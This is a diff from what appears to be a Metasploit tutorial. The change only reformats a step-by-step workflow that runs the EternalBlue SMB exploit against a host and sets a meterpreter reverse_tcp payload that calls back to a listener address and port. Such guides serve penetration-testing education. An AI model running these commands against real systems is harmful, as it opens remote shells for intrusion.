@@ -344,37 +344,37 @@ manual Requires manual configuration
 
 Always choose the highest rank available for your target using an exploit.
 
-Step-by-step workflow:
-# Select an exploit
+##Step-by-step workflow:
+- Select an exploit
 use exploit/windows/smb/ms17_010_eternalblue
 
-# Show available options
+- Show available options
 show options
 
-# Set required parameters
+- Set required parameters
 set RHOSTS 192.168.1.10
 set RPORT 445
 
-# Show available targets (different OS versions)
+- Show available targets (different OS versions)
 show targets
 
-# Set specific target if needed
+- Set specific target if needed
 set target 0
 
-# Show payloads that work with this exploit
+- Show payloads that work with this exploit
 show payloads
 
-# Set your payload
+- Set your payload
 set payload windows/x64/meterpreter/reverse_tcp
 
-# Set payload options
+- Set payload options
 set LHOST 192.168.1.5
 set LPORT 4444
 
-# Test if target is vulnerable (if Check says Yes)
+- Test if target is vulnerable (if Check says Yes)
 check
 
-# Run the exploit
+- Run the exploit
 run
 
 Useful module commands:
